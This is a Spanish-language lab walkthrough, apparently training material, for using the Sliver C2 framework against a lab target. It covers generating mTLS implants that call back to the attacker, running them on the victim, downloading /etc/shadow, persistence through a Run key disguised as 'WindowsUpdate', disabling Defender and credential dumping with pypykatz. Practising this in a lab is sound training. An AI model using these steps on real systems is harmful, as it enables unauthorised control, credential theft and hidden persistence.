C2 – Sliver (Command & Control)

En este laboratorio practicarás técnicas básicas de Command & Control con Sliver. Primero conéctate por SSH a la máquina objetivo con alguno de los usuarios (por ejemplo admin / password1, o alice, bob) similar al lab de Bruteforce. Después instala y levanta un servidor Sliver en tu Kali, genera un implant (implant/payload), y ejecuta ese implant en la máquina víctima para obtener una sesión C2.

# Conexión SSH al objetivo (ejemplo)
ssh admin@TARGET_IP
# Nota: usa las credenciales del lab o las descubiertas por bruteforce

Objetivos del lab

  • Conectar por SSH a la máquina de laboratorio.
  • Levantar Sliver C2 en Kali y generar un implant para la arquitectura objetivo.
  • Transferir y ejecutar el implant en la víctima.
  • Interactuar con la sesión Sliver, enumerar y escalar privilegios básicos.

Resumen rápido — Pasos para usar Sliver

  1. Instalar Sliver en Kali (cliente + servidor): 
    curl -sSL https://sliver.sh/install | sudo bash
  2. Iniciar Sliver (abre la CLI interactive): 
    sliver
# en la primera ejecución generará certificados y abrirá el prompt
  3. Generar un implant (reemplaza con la IP de tu máquina atacante — en este lab se autocompleta con la IP del cliente): 
    # Windows (amd64)
sliver > generate --mtls {{ client_ip }}:443 --os windows --arch amd64

# Linux (amd64)
sliver > generate --mtls {{ client_ip }}:443 --os linux --arch amd64

# macOS (arm64)
sliver > generate --mtls {{ client_ip }}:443 --os mac --arch arm64
  4. Levantar un listener mTLS en Sliver: 
    sliver > mtls --lport 443
sliver > jobs        # verifica que el job esté activo
  5. Transferir el implant a la víctima y ejecutarlo (ejemplos): 
    # Desde Kali: scp/powershell/curl según plataforma
      scp /home/kali/IMPLANT_NAME.exe admin@{{ target_ip }}:/tmp/
      # En la víctima Windows (PowerShell):
      .\IMPLANT_NAME.exe
      # En Linux/Mac: subir binario y ejecutar: ./IMPLANT_NAME
  6. Comprobar sesiones desde Sliver y usarla: 
    sliver > sessions
sliver > use 
sliver (SESSION) > help
  7. Acciones post-explotación (ejemplos):
    • Listar procesos: ps -aux
    • Información de sesión: info (hostname, user, uid, active C2)
    • Comprobar identidad y privilegios: execute -o id, execute -o whoami
    • Intentar escalada/privilegios: execute -o sudo -l (si aplica)
    • Descargar archivos importantes: download /etc/shadow /home/kali/shadow (requiere privilegios)
    • Ejecutar comandos remotos: execute -o uname -a
  8. Persistencia básica (Windows example): 
    sliver (SESSION) > execute -o cmd -Command "reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d \"C:\\Users\\Public\\IMPLANT_NAME.exe\" /f"

Consejos y OPSEC para el laboratorio

  • Los implants de Sliver son pesados (~15MB) y usan cifrado mTLS por defecto.
  • Si Defender detecta el binario en Windows, desactívalo únicamente en entorno controlado del laboratorio.
  • Practica migración de procesos, dumps de memoria (procdump) y extracción con pypykatz en tu Kali para ver credenciales.
